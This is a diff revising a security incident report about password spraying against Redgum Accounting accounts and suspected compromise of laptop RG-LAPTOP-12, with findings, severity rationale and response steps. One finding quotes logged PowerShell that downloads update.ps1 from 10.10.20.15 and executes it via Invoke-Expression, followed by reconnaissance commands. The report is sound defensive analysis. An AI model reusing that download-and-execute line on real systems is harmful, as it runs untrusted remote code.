@@ -1,59 +1,161 @@
-# Incident Report
+# Incident Report — INC-005
 
-## 1. Executive Summary
+## Executive Summary
 
-Redgum Accounting Pty Ltd reported unusual authentication activity involving employee accounts. Initial Windows Security Event Log evidence showed seven failed authentication attempts against `REDGUM\j.smith` from `192.168.1.44`, followed by a successful network authentication.
+Redgum Accounting Pty Ltd reported unusual Windows authentication activity involving multiple employee accounts.
 
-Further evidence established that the same internal source attempted authentication against multiple user accounts within seconds of one another. This pattern is consistent with password spraying. A successful authentication to `r.brown` was then observed from the same source.
+Initial authentication telemetry showed repeated failed logon attempts originating from `192.168.1.44`. Correlation with domain-controller events showed that the source attempted authentication against multiple accounts within a short timeframe, consistent with password spraying.
 
-The source address was identified as `RG-LAPTOP-12`, a company laptop assigned to John Smith. John confirmed he was not using the device at the time and that the laptop was physically in the office.
+A successful authentication to `REDGUM\r.brown` subsequently occurred from the same source.
 
-Subsequent process-creation and PowerShell Script Block Logging evidence showed PowerShell retrieving a remote script from `10.10.20.15` and executing its contents through `Invoke-Expression` (`IEX`). Follow-on commands enumerated processes, services, and the current security context.
+The source IP was identified as `RG-LAPTOP-12`, a company laptop assigned to John Smith. John confirmed he was not using the laptop during the relevant period.
 
-Based on the available evidence, the incident is assessed as **Critical** due to probable credential compromise, suspected endpoint compromise, remote PowerShell code execution, and reconnaissance activity.
+Further endpoint telemetry showed PowerShell execution followed by retrieval of a remote PowerShell script from `10.10.20.15`. The retrieved content was passed to `Invoke-Expression` (`IEX`), indicating execution of dynamically retrieved PowerShell content.
 
-## 2. Incident classification
+Follow-on commands performed process, service, and security-context discovery.
 
-| Field | Assessment |
-|---|---|
-| Incident type | Credential compromise / endpoint compromise |
-| Primary technique | Password spraying |
-| Post-authentication activity | PowerShell remote script retrieval and execution |
-| Severity | Critical |
-| Affected endpoint | `RG-LAPTOP-12` |
-| Assigned user | John Smith |
-| Primary source | `192.168.1.44` |
-| Remote host | `10.10.20.15` |
-| Confirmed malicious file | Not established from supplied evidence |
-| Data exfiltration | Not established |
-| Privilege escalation | Not established |
+Based on the supplied evidence, the incident is classified as **High severity** and requires immediate containment and further investigation.
 
-## 3. Key findings
+---
 
-1. Multiple user accounts were targeted from a single internal source.
-2. The authentication failures occurred rapidly and across different accounts, supporting a password-spraying hypothesis.
-3. `r.brown` subsequently authenticated successfully from the same source.
-4. John Smith confirmed he was not using `RG-LAPTOP-12` during the activity.
-5. `RG-LAPTOP-12` generated suspicious PowerShell process activity.
-6. PowerShell retrieved a script from `10.10.20.15`.
-7. `IEX` executed the downloaded content as PowerShell code.
-8. Follow-on commands performed process, service, and security-context discovery.
-9. The evidence supports treating the endpoint and affected credentials as potentially compromised.
+## Incident Classification
 
-## 4. Analyst conclusion
+| Field                                    | Assessment                                        |
+| ---------------------------------------- | ------------------------------------------------- |
+| Incident ID                              | INC-005                                           |
+| Incident Type                            | Credential Attack / Suspected Endpoint Compromise |
+| Severity                                 | **High**                                          |
+| Primary Attack                           | Password Spraying                                 |
+| Affected Endpoint                        | `RG-LAPTOP-12`                                    |
+| Assigned User                            | John Smith                                        |
+| Source IP                                | `192.168.1.44`                                    |
+| Remote Script Host                       | `10.10.20.15`                                     |
+| Affected Account Requiring Investigation | `REDGUM\r.brown`                                  |
+| Confirmed Malware                        | Not established                                   |
+| Confirmed Persistence                    | Not established                                   |
+| Confirmed Privilege Escalation           | Not established                                   |
+| Confirmed Lateral Movement               | Not established                                   |
+| Confirmed Data Exfiltration              | Not established                                   |
 
-The most likely scenario is that `RG-LAPTOP-12` was under unauthorised control and was used to conduct credential attacks against multiple domain accounts. A successful authentication was followed by PowerShell activity that retrieved and executed remote code and performed host/security-context reconnaissance.
+---
 
-The available evidence is sufficient to treat the incident as a critical security event requiring immediate containment. However, the supplied evidence does not independently establish the identity of the operator, the exact contents/intent of the remote script, persistence, lateral movement, privilege escalation, or data exfiltration.
+## Key Findings
 
-## 5. Confidence
+### Finding 1 — Password Spraying
 
-**High confidence:** password spraying pattern; successful authentication; suspicious PowerShell execution; reconnaissance.
+Multiple user accounts were targeted from `192.168.1.44` within seconds.
 
-**Moderate confidence:** endpoint compromise.
+The activity pattern is more consistent with password spraying than repeated password guessing against a single account.
 
-**Not established:** malware classification, persistence, lateral movement, privilege escalation, data exfiltration.
+### Finding 2 — Successful Authentication
 
-## 6. Immediate priority
+A successful authentication to `REDGUM\r.brown` occurred following the failed authentication activity.
 
-Isolate `RG-LAPTOP-12`, protect potentially compromised credentials, preserve evidence, identify `10.10.20.15`, and investigate whether the successful `r.brown` authentication resulted in access to additional systems or data.
+This requires investigation to determine whether the credential was compromised or legitimately used.
+
+### Finding 3 — Endpoint Attribution
+
+`192.168.1.44` was identified as `RG-LAPTOP-12`.
+
+The laptop was assigned to John Smith.
+
+John confirmed he was not operating the laptop during the relevant activity window.
+
+### Finding 4 — PowerShell Remote Retrieval and Execution
+
+PowerShell Script Block Logging recorded:
+
+```powershell
+$u = "http://10.10.20.15/update.ps1"
+IEX (New-Object Net.WebClient).DownloadString($u)
+```
+
+The evidence indicates that PowerShell retrieved remote content and passed the resulting string to `Invoke-Expression` for execution.
+
+The actual contents and intent of `update.ps1` have not been provided and therefore cannot be independently classified as malware from this evidence alone.
+
+### Finding 5 — Post-Execution Reconnaissance
+
+Subsequent commands included:
+
+```powershell
+Get-Process
+Get-Service
+whoami /all
+```
+
+These commands are consistent with process, service, and security-context discovery.
+
+---
+
+## Severity Rationale
+
+### HIGH
+
+The combination of:
+
+* password spraying;
+* successful authentication;
+* suspected endpoint compromise;
+* remote PowerShell script retrieval;
+* dynamic PowerShell execution;
+* post-execution reconnaissance
+
+creates a credible risk of active compromise.
+
+The incident is not currently classified as Critical because the available evidence does not establish privileged compromise, persistence, lateral movement, data exfiltration, ransomware, or widespread organisational impact.
+
+### Critical Escalation Triggers
+
+Escalate to Critical if additional investigation confirms:
+
+* privileged account compromise;
+* persistence;
+* lateral movement;
+* confirmed malware;
+* sensitive data access/exfiltration;
+* multiple compromised hosts;
+* material business impact.
+
+---
+
+## Immediate Response
+
+1. Isolate `RG-LAPTOP-12`.
+2. Preserve endpoint evidence before reimaging or wiping.
+3. Investigate and protect the `r.brown` credential.
+4. Review all accounts targeted during the password-spraying activity.
+5. Identify and investigate `10.10.20.15`.
+6. Preserve PowerShell and Windows authentication logs.
+7. Retrieve and safely analyse `update.ps1`.
+8. Search for the same indicators across other endpoints.
+9. Review authentication and endpoint telemetry for lateral movement.
+10. Escalate severity if additional compromise is confirmed.
+
+---
+
+## Evidence Limitations
+
+The supplied evidence does not establish:
+
+* attacker identity;
+* credential acquisition method;
+* exact script contents;
+* persistence;
+* privilege escalation;
+* lateral movement;
+* data access;
+* data exfiltration;
+* malicious ownership of `10.10.20.15`.
+
+These remain investigation priorities.
+
+---
+
+## Analyst Conclusion
+
+The evidence supports a **High-severity security incident involving password spraying and probable endpoint compromise**.
+
+The strongest evidence of escalation is the combination of successful authentication and PowerShell retrieving and executing remote content.
+
+The endpoint should be contained immediately while preserving evidence for further forensic investigation.
